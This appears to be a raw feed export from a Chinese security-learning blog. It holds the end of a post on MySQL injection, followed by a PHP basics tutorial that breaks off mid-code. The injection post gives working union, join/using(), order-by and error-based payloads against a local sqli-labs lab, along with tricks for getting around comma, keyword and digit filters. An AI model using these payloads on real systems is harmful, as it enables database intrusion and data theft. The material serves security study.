keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'A'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210524113744160.png" alt="image-20210524113744160"></p><p>或者给要查询的列也起别名</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">c</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">as</span> <span class="token number">a</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> <span class="token number">b</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">as</span> <span class="token number">c</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210524114004881.png" alt="image-20210524114004881"></p><h3 id="注入示例"><a href="#注入示例" class="headerlink" title="注入示例"></a>注入示例</h3><blockquote><p>这里以sql-labs-1为例</p></blockquote><ul><li>payload</li></ul><blockquote><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/sql-labs/Less-1/?id=0' union select 1,2,group_concat(`3`) from (select 1,2 ,3 union select * from security.users)n--+</span><span class="token shell-comment comment">#联合注入之无列名注入</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><p>无列名只是把查询真实表改为了查询虚拟表，其他部分差别不大</p><h3 id="无列名时使用join得到字段名"><a href="#无列名时使用join得到字段名" class="headerlink" title="无列名时使用join得到字段名"></a>无列名时使用join得到字段名</h3><ul><li><p>原理</p><p>  join 用于连接两个表，将两个表的数据同时显示</p><p>  <img src="image-20210524194300573.png" alt="image-20210524194300573"></p><p>  上图是将两表简单相合，是一个无名称的虚拟表</p><p>  当两表中列名存在重复时给虚拟表起别名，便会报错</p><p>  如下</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token number">a</span> <span class="token keyword">join</span> emails <span class="token number">b</span><span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token number">a</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  先分别查出users和emails的数据，并连接为一个虚拟表，起别名为a，然后查询虚拟表a，这时a表会出现名称重复的字段，数据库报错</p><p>  <img src="image-20210524200514332.png" alt="image-20210524200514332"></p><p>  原理同下</p><p>  <img src="image-20210524200634790.png" alt="image-20210524200634790"></p><p>  通过这个原理，我们就可以在系统库被过滤的情况中完成对列名的注入</p></li></ul><h4 id="无列名payload示例"><a href="#无列名payload示例" class="headerlink" title="无列名payload示例"></a>无列名payload示例</h4><blockquote><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#完整sql语句</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'0'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">join</span> users <span class="token number">b</span> <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>n<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="image-20210524201435423.png" alt="image-20210524201435423"></p></blockquote><ul><li><p>详解</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'$id'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  这是系统本身的查询语句</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span>语句体<span class="token punctuation">)</span>n<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  这里构造了一个典型的联合查询，n为表名，语句体是无列名注入的语句</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> users <span class="token keyword">join</span> users <span class="token number">b</span><span class="token punctuation">)</span>n<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  括号中语句构造了一个虚拟表，因为是由两个users表使用join语句连接而成，所以必然出现列名重复报错，别名为n便于查询</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">join</span> users <span class="token number">a</span><span class="token punctuation">)</span>n<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  join查询的两个表不能重名，所以要将一个表起别名</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">join</span> users <span class="token number">a</span> <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>n<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  using()方法用于join中，规定join两个表连接时字段名相同的列</p><p>  使用using()后，列名不会重复</p><p>  <img src="image-20210525151501090.png" alt="image-20210525151501090"></p><p>  同一张表也遵循这个原理</p><p>  <img src="image-20210525151557761.png" alt="image-20210525151557761"></p><p>  using()目的：</p><p>  <strong>列名重复报错只会报错第一列，而不会全部报错</strong></p><p>  <strong>using()方法可以解决这个问题</strong></p></li><li><p>注入完整语句</p><pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//127.0.0.1/sql-labs/Less-1/?id=0' union select 1,2,3 from (select * from users join users b using(id,username))n--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="image-20210525152003540.png" alt="image-20210525152003540"></p></li></ul><h2 id="过滤括号的order-by-大小比较注入"><a href="#过滤括号的order-by-大小比较注入" class="headerlink" title="过滤括号的order by 大小比较注入"></a>过滤括号的order by 大小比较注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul><li>order by 方法用于指定列排序，默认是升序</li><li>union select 联合查询可以输出一个虚拟表，表中同时存在原表的数据和联合的数据</li><li>order by 同样可以对虚拟表进行排序</li></ul><h3 id="payload举例"><a href="#payload举例" class="headerlink" title="payload举例"></a>payload举例</h3><blockquote><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210526180009845.png" alt="image-20210526180009845"></p></blockquote><p><strong>目标是得到password的数据，使用union select 1,2,3 时，联合的第三列虚拟数据为3和Dumb,order by 排序时默认升序，所以会将3排在首列，当union select 连接的数据为1,2,”E”时，E比原表的D值更大，于是E排在了Dumb下面</strong></p><p><img src="image-20210526180533170.png" alt="image-20210526180533170"></p><p>这两种情况的页面回显必然有所不同，这样就可以通过回显来判断出password数据</p><p><img src="image-20210526180748854.png" alt="image-20210526180748854"></p><h2 id="特殊拦截的绕过方法"><a href="#特殊拦截的绕过方法" class="headerlink" title="特殊拦截的绕过方法"></a>特殊拦截的绕过方法</h2><h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><blockquote><p>使用盲注</p><p><strong>subsrt()函数使用substr(data from 1 for 1) 代替 substr(data,1,1)</strong> </p><p>from 1 for 1 :从1到1</p><p><strong>limit 0,1 使用 limit 0 offset 1 代替</strong></p><p>offset 1 ：偏移量1</p></blockquote><h3 id="其他系统关键字被过滤-拦截"><a href="#其他系统关键字被过滤-拦截" class="headerlink" title="其他系统关键字被过滤/拦截"></a>其他系统关键字被过滤/拦截</h3><ol><li>双写绕过关键字过滤</li><li>使用同义函数/语句代替，如if函数可用<code>case when condition then 1 else 0 end</code>语句代替。</li></ol><h3 id="数字被过滤-拦截"><a href="#数字被过滤-拦截" class="headerlink" title="数字被过滤/拦截"></a>数字被过滤/拦截</h3><blockquote><p>下表摘自<a href="https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html">MySQL注入技巧</a></p></blockquote><table><thead><tr><th>代替字符</th><th>数</th><th>代替字符</th><th>数、字</th><th>代替字符</th><th>数、字</th><th></th><th></th></tr></thead><tbody><tr><td>false、!pi()</td><td>0</td><td>ceil(pi()*pi())</td><td>10\</td><td>A</td><td>ceil((pi()+pi())*pi())</td><td>20\</td><td>K</td></tr><tr><td>true、!(!pi())</td><td>1</td><td>ceil(pi()*pi())+true</td><td>11\</td><td>B</td><td>ceil(ceil(pi())*version())</td><td>21\</td><td>L</td></tr><tr><td>true+true</td><td>2</td><td>ceil(pi()+pi()+version())</td><td>12\</td><td>C</td><td>ceil(pi()*ceil(pi()+pi()))</td><td>22\</td><td>M</td></tr><tr><td>floor(pi())、~~pi()</td><td>3</td><td>floor(pi()*pi()+pi())</td><td>13\</td><td>D</td><td>ceil((pi()+ceil(pi()))*pi())</td><td>23\</td><td>N</td></tr><tr><td>ceil(pi())</td><td>4</td><td>ceil(pi()*pi()+pi())</td><td>14\</td><td>E</td><td>ceil(pi())*ceil(version())</td><td>24\</td><td>O</td></tr><tr><td>floor(version()) //注意版本</td><td>5</td><td>ceil(pi()*pi()+version())</td><td>15\</td><td>F</td><td>floor(pi()*(version()+pi()))</td><td>25\</td><td>P</td></tr><tr><td>ceil(version())</td><td>6</td><td>floor(pi()*version())</td><td>16\</td><td>G</td><td>floor(version()*version())</td><td>26\</td><td>Q</td></tr><tr><td>ceil(pi()+pi())</td><td>7</td><td>ceil(pi()*version())</td><td>17\</td><td>H</td><td>ceil(version()*version())</td><td>27\</td><td>R</td></tr><tr><td>floor(version()+pi())</td><td>8</td><td>ceil(pi()*version())+true</td><td>18\</td><td>I</td><td>ceil(pi()*pi()*pi()-pi())</td><td>28\</td><td>S</td></tr><tr><td>floor(pi()*pi())</td><td>9</td><td>floor((pi()+pi())*pi())</td><td>19\</td><td>J</td><td>floor(pi()*pi()*floor(pi()))</td><td>29\</td><td>T</td></tr></tbody></table><h2 id="报错注入详解"><a href="#报错注入详解" class="headerlink" title="报错注入详解"></a>报错注入详解</h2><h3 id="报错注入类型"><a href="#报错注入类型" class="headerlink" title="报错注入类型"></a>报错注入类型</h3><ul><li>大数溢出</li><li>函数报错</li><li>主键，字段重复</li></ul><h3 id="大数溢出"><a href="#大数溢出" class="headerlink" title="大数溢出"></a>大数溢出</h3><p>sql可以运行并处理的数是有限的，当数超过上限，便会发生大数溢出</p><ul><li><p>主要函数</p><p>  exp(),pow()</p><p>  exp和pow两个函数都用来计算次方，exp(2)表示e的2次,pow(2,2)表示2的2次</p><p>  <img src="image-20210526204055248.png" alt="image-20210526204055248"></p><p>  若平方过大，则报错</p><p>  <img src="image-20210526204130441.png" alt="image-20210526204130441"></p></li><li><p>payload</p><pre class="line-numbers language-sql"><code class="language-sql">exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>这里我也不懂，此方法仅限mysql5使用</p><h3 id="函数报错"><a href="#函数报错" class="headerlink" title="函数报错"></a>函数报错</h3><p><strong>最常见的是updatexml()和extractvalue()函数，在注入攻击中已经提及</strong></p><p>其他函数这里不想解释了，看最下面特别鸣谢吧</p><h1 id="特别鸣谢：https-xz-aliyun-com-t-7169"><a href="#特别鸣谢：https-xz-aliyun-com-t-7169" class="headerlink" title="特别鸣谢：https://xz.aliyun.com/t/7169"></a>特别鸣谢：<a href="https://xz.aliyun.com/t/7169">https://xz.aliyun.com/t/7169</a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php学习笔记</title>
      <link href="/2020/11/28/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/11/28/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="php是世界上最自由的语言"><a href="#php是世界上最自由的语言" class="headerlink" title="php是世界上最自由的语言"></a>php是世界上最自由的语言<hr/></h1><h2 id="php学习的必要准备工作"><a href="#php学习的必要准备工作" class="headerlink" title="php学习的必要准备工作"></a>php学习的必要准备工作</h2><ul><li>在php学习中，需要准备两样软件。<blockquote><p>阿帕奇（apache）和mysql。<br>这两搭建环境非常麻烦，所以我建议先学习他们的搭建过程，然后直接下载phpstudy集成环境。<br>一定要先学习搭建过程，毕竟世界上最恐怖的事就是拿到了傻瓜版操作软件却不会用。<br><img src="0.png" alt="0"></p></blockquote></li></ul><h2 id="php基础之常量和变量"><a href="#php基础之常量和变量" class="headerlink" title="php基础之常量和变量"></a>php基础之常量和变量</h2><h3 id="php语法和标记符"><a href="#php语法和标记符" class="headerlink" title="php语法和标记符"></a>php语法和标记符</h3><ul><li><p>标记和注释  </p><blockquote><p>标记：现在通用为’&lt;?php? &gt;’其他不做说明。<br>注释：php语言可用大部分语言的注释格式进行注释<br>如/<em>..</em>/,#,//等都可以使用。  </p></blockquote></li><li><p>php语法格式  </p><blockquote><p>php语言以&lt;?php做开头，以？&gt;结尾。<br>php变量用$表示，$后内容可以自行定义，但不能以数字开头<br>php同c语言一般,每句代码后都需要用”;”作为结束，相对的，我们可以省略用与结尾的？&gt;。<br>例如：<br>&lt;？php<br>$name=”mujie”;<br>echo $name;<br>？&gt;<br>此代码会在网页输出mujie。  </p></blockquote></li><li><p>php替代语法</p><blockquote><p>php对分支结构和循环结构均提供了替代语法</p><p>全部对应一个模式</p><p>例如：</p><p>for(str1;str2;str3){</p><p>​    内容；</p><p>}</p><p>可以将花括号替代为：</p><p>for(str1;str2;str3):</p><p>​    内容；</p><p>endfor;</p></blockquote></li></ul><h3 id="php变量"><a href="#php变量" class="headerlink" title="php变量"></a>php变量</h3><ul><li>变量的概念  <blockquote><p>变量来源于数学，是计算机中储存结果和表示值的抽象概念，变量是可变的。  </p></blockquote></li><li>变量的使用  <blockquote><p>在系统中增加变量的名字并给变量赋值。<br>变量使用$开头<br>格式：$[变量名]=”[赋值内容]”;<br>变量名的第一个字符不能是数字。  </p></blockquote></li><li>预定义变量<br><img src="1.png" alt="1"></li><li>可变变量  <blockquote><p>如果一个变量的值是另一个变量的名字，就会输出另一个变量<br>可变变量用$$引用。<br>相当于连续赋值。<br>例如：<br>$a=b;<br>$b=1234;<br>echo $$a;<br>输出结果是1234.</p></blockquote></li><li>变量传值  <blockquote><p>值传递：<br>值传递是将一个变量的值“复制”给另一个变量，虽然值一样，但变量的储存区间不同，所以两者没有影响。<br>例如：<br>$a=1;<br>$b=$a;<br>就属于值传递。</p></blockquote></li></ul><blockquote><p>引用传递和值传递的区别是引用前后的变量值都存储在同一个位置中。<br>引用传递用&amp;表示<br>例如：<br>$a=123;<br>$b=&amp;$a;<br>便是把a的值引用给b。</p></blockquote><p>注：当程序运行完毕后，变量会被删除，如果不想变量被删除，需要写入域[后面会说到]。    </p><h3 id="php常量"><a href="#php常量" class="headerlink" title="php常量"></a>php常量</h3><ul><li><p>常量的定义  </p><blockquote><p>常量是在运行中不可改变的量。 </p><p>在PHP 5.3.0 之后的版本中，你可以用 <a href="https://www.php.net/manual/zh/function.define.php">define()</a> 函数，或 <code>const</code> 两种方法来定义一个常量。函数 <a href="https://www.php.net/manual/zh/function.define.php">define()</a> 允许将常量定义为一个表达式，而 <code>const</code> 关键字有一些限制，一个常量一旦被定义，就不能再改变或者取消定义。</p><p>使用 <code>const</code> 关键字定义常量时，PHP 5.6 之前只能包含标量数据（boolean，integer，float 和 string）。从 PHP 5.6 开始，可以将常量定义为一个表达式，也可以定义为一个 array。还可以定义 resource 为常量，但应尽量避免，因为可能会造成不可预料的结果。</p></blockquote></li><li><p>常量的使用形式  </p><blockquote><p>在php5.3后，常量有两中定义方式<br>1- 使用函数define<br>格式：define(“常量名”，常量值);</p></blockquote><blockquote><p>2- const 常量名=值;<br>通常用大写字母定义。  </p></blockquote><blockquote><p>3- constant 针对有特殊名字的常量(名字以数字开头，或有-之类不合法字符的常量)<br>格式：constant(“常量名”);  </p></blockquote></li><li><p>系统常量<br><img src="2.png" alt="2"></p></li><li><p>魔术常量<br><img src="3.png" alt="3"></p></li></ul><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p><u><em><strong>类是面向对象的过程</strong></em></u></p><ul><li>class  </li></ul><blockquote><p>在php中，可以使用class定义类 </p><p>一个类可以包含有属于自己的 <a href="https://www.php.net/manual/zh/language.oop5.constants.php">常量</a>，<a href="https://www.php.net/manual/zh/language.oop5.properties.php">变量</a>（称为“属性”）以及函数（称为“方法”）语法：<br>[修饰关键字] class [类名] {<br>类的属性和方法<br>}  </p></blockquote><h3 id="类的调用"><a href="#类的调用" class="headerlink" title="类的调用"></a>类的调用</h3><h4 id="方法的调用"><a href="#方法的调用" class="headerlink" title="方法的调用"></a>方法的调用</h4><blockquote><p>当一个方法在类定义内部被调用时，有一个可用的伪变量 $this。</p><p>$this 是一个到当前对象的引用。</p><p>以静态方式去调用静态方法时将会抛出一个Error</p></blockquote><h4 id="self-与-this"><a href="#self-与-this" class="headerlink" title="self 与 $this"></a>self 与 $this</h4><blockquote><p><strong>1.self代表类，$this代表对象</strong><br><strong>2.能用$this的地方一定使用self，能用self的地方不一定能用$this</strong><br><strong>静态的方法中不能使用$this，静态方法给类访问的。</strong></p><p><strong>3、$this是实例化对象的指针，self是对象的指针。</strong></p><p><u><strong>!!!!!!!!本质都是指针</strong></u></p><p><img src="https://images2018.cnblogs.com/blog/779030/201809/779030-20180910170105248-1450602458.png" alt="img"></p><p>self调用的类的指针，而非实例化后的对象指针，静态变量和静态方法始终属于类，而非属于实例化后的对象，因此在静态方法中无法使用$this，因为此时所处的位置是类所在的指针，只能使用self调用静态方法或者静态变量。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">demo</span> <span class="token punctuation">{</span> <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>     <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">funct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$newObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">self</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$newObj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">funct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">funct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">*</span> <span class="token number">200</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getC</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span>  self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$demo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">demo</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$demo</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$demo</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$demo2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">demo</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$demo2</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$demo</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$demo2</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$demo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字:"></a>关键字:</h3><blockquote><p>关键字不能修饰成员属性，只能修饰类和方法</p><ul><li><p>abstract 译为：摘要<br> 抽象类或方法，被修饰为抽象类之后，类将不能被实例化，但可以被继承。<br> 如果类中有至少一个方法被声明为抽象的，那么这个类也必须声明为抽象的。继承一个抽象类的时候，子类必须重新定义父类中的所有抽象方法，而且这些方法的访问控制必须和父类中一样。 </p><p> 属性无法抽象</p></li><li><p>final 译为： 最终的</p><p> 定义一个不能被继承的类</p></li></ul></blockquote><h3 id="属性和方法："><a href="#属性和方法：" class="headerlink" title="属性和方法："></a>属性和方法：</h3><h4 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h4><blockquote><p>类的属性和方法存在于不同的“命名空间”中，这意味着同一个类的属性和方法可以使用同样的名字。在类中访问属性和调用方法使用同样的操作符。</p><p>具体是访问一个属性还是调用一个方法，取决于你的上下文，即用法是变量访问还是函数调用。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Foo</span><span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token variable">$bar</span> <span class="token operator">=</span> <span class="token string">'property'</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">return</span> <span class="token string">'method'</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bar</span><span class="token punctuation">,</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">,</span> <span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使用$obj->bar,定位类中具体的属性或方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1、成员属性就是对该类定义的一些变量属性</p><p>2、类中声明成员属性要使用关键字</p><p>​    常见成员属性声明是由关以下键字</p><p>​    public，var，protected，private开头的，然后跟一个变量来组成的。还有一些成员属性包括，静态static,常量const.</p></blockquote><h4 id="属性关键字"><a href="#属性关键字" class="headerlink" title="属性关键字"></a>属性关键字</h4><blockquote><blockquote><p>public 译为：公众的 </p><ul><li>从PHP5.0版本开始，对象声明时需要声明对象属性和方法的可见性，public关键字表示属性或方法是公开可见的。</li><li>在PHP5.0之前未支持对象属性和方法的可见性定义，默认所有的属性和方法都是公开可见的</li><li>类的内外都可以调用</li></ul></blockquote><blockquote><p>protected 译为：受保护的</p><ul><li>类内和派生类能用，类外不能用</li></ul></blockquote><blockquote><p>private 译为：私有的</p><ul><li>私有的，定义只能类内使用的变量</li></ul></blockquote><blockquote><p>static 译为：静止的</p><ul><li>用static修饰的成员属性可以被同一个类的所有对象共享</li><li>用法同php的域，可保留程序运行后变量的值</li></ul></blockquote><blockquote><p>const 译为：常量</p><ul><li>在类的声明中常量必须使用const</li></ul></blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//代码示例</span><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*** Define MyClass*/</span><span class="token keyword">class</span> <span class="token class-name">MyClass</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token variable">$public</span> <span class="token operator">=</span> <span class="token string">'Public'</span><span class="token punctuation">;</span>  <span class="token keyword">protected</span> <span class="token variable">$protected</span> <span class="token operator">=</span> <span class="token string">'Protected'</span><span class="token punctuation">;</span>  <span class="token keyword">private</span> <span class="token variable">$private</span> <span class="token operator">=</span> <span class="token string">'Private'</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">printHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">public</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">protected</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">private</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token operator">-</span><span class="token 